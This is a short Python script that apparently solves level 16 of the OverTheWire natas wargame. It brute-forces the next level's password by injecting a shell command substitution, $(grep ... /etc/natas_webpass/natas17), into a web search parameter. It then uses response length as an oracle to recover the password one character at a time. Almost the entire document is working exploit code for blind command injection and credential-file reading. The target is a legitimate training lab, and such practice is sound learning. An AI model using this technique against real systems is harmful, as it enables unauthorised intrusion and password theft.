import requests

url = "http://natas16.natas.labs.overthewire.org"
auth = ("natas16", "secret")

# first we print numbers becouse its speed up bruteforce
alphabet = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ-_."
password = ""

print("[*]initializing bruteforce")

marker_word = "African"

for position in range(1, 33):
    found_next_char = False

    for char in alphabet:
        payload = f"$(grep \^{password}{char} /etc/natas_webpass/natas17){marker_word}"

        params = {'needle': payload}
        response = requests.get(url, params=params, auth=auth)

        print(f"Position {position}, checking symbol: {char}, longitude of answer: {len(response.text)}")  # Using Python function len() to evaluate the size of the HTTP responce body 
        
    
        if len(response.text) == 1105: # Using this data like validation trigger. It filters out incorrect characters like symbols that result in an 1122 byte response after being sent
            password += char
            print(f"[*]Word has founded {position}! : {char} --> Current password: {password}")
            found_next_char = True
            break

    if not found_next_char:
        print("[!]Something went wrong! word dont have a position in password.")
        break



print(f"[!!!]Congratulations! full password is: {password}")